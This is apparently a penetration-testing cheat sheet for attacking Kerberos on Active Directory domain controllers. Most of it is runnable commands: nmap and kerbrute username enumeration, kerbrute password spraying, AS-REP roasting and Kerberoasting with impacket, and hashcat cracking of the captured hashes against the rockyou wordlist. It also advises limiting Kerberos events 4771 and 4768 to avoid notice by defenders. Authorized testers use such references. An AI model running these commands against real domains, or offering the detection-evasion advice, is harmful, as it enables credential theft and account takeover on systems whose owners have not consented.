# Kerberos (88)

!!! tip "Start here"
    Port 88 identifies a Kerberos KDC; in an Active Directory environment this is normally a domain controller. Establish the realm/domain before username enumeration or AS-REP roasting.

---

## Enumeration

```bash
nmap -sV -p 88 $DC_IP
```

---

## Username Enumeration

```bash
nmap -p 88 --script krb5-enum-users --script-args="krb5-enum-users.realm=$DOMAIN,userdb=users.txt" $DC_IP
kerbrute userenum -d $DOMAIN --dc $DC_IP users.txt
```

---

## Password Spraying

Validate a single approved password against a scoped user list. In Active Directory, Kerberos pre-authentication failures generate Event ID 4771 and can trigger lockouts or detection just like other authentication spraying.

```bash
kerbrute passwordspray -d $DOMAIN --dc $DC_IP users.txt 'Winter2024!'
```

To spray a small credential set without triggering lockouts, respect the domain lockout threshold (`nxc smb $DC_IP -u '' -p '' --pass-pol` or query from LDAP) and keep attempts well under it.

!!! warning "Watch out"
    Even with low attempt counts, spraying generates enough 4771s to stand out if the blue team is watching pre-auth failures. On monitored environments, limit to one spray per password and pull user lists from existing LDAP/BloodHound data rather than kerbrute userenum, which itself generates 4768s per attempt.

---

## ASREPRoasting (No Credentials)

Accounts with pre-authentication disabled return a crackable AS-REP hash without any password.

```bash
impacket-GetNPUsers $DOMAIN/ -usersfile users.txt -dc-ip $DC_IP -no-pass -request -format hashcat -outputfile asrep-hashes.txt
```

```bash
hashcat -m 18200 asrep-hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## Kerberoasting (Requires Valid Credentials)

Request TGS tickets for accounts with SPNs, the encrypted tickets are crackable offline.

```bash
impacket-GetUserSPNs "$DOMAIN/$USERNAME:$PASSWORD" -dc-ip $DC_IP -request -outputfile tgs-tickets.txt
```

```bash
hashcat -m 13100 tgs-tickets.txt /usr/share/wordlists/rockyou.txt
```
